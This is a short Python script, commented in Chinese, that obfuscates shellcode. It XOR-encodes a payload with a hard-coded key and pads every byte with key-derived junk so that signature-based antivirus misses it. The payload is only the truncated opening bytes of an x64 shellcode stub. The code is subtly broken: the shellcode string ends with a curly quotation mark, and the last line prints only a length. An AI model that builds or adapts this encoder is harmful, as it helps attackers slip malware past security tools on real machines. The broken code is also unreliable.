def xor(shellcode, key):
    new_shellcode = ""
    key_len = len(key)
    # 对shellcode的每一位进行xor亦或处理
    for i in range(0, len(shellcode)):
        s = ord(shellcode[i])
        p = ord((key[i % key_len]))
        s = s ^ p  # 与p异或，p就是key中的字符之一
        s = chr(s) 
        new_shellcode += s
    return new_shellcode

def add_random_code(shellcode, key):
    new_shellcode = ""  
    key_len = len(key)
    # 每个字节后面添加随机一个字节，随机字符来源于key
    for i in range(0, len(shellcode)):
        new_shellcode += shellcode[i]
        new_shellcode += key[i % key_len]
    return new_shellcode


# 将shellcode打印输出
def str_to_hex(shellcode):
    raw = ""
    for i in range(0, len(shellcode)):
        s = hex(ord(shellcode[i])).replace("0x",'')
        if len(s) == 1:
            s = "0" + s
        raw =raw + "\\x" + s
    return raw


shellcode = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00“
# 这是异或和增加随机字符使用的key，为了提高复杂度也可以使用两个key
key = "fdaufdiqe" 

# 首先对shellcode进行异或处理
shellcode = xor(shellcode, key)
print(len(shellcode))

# 然后在shellcode中增加随机字符
shellcode = add_random_code(shellcode, key)
print(len(shellcode))

# 将shellcode打印出来
print(len(str_to_hex(shellcode)))
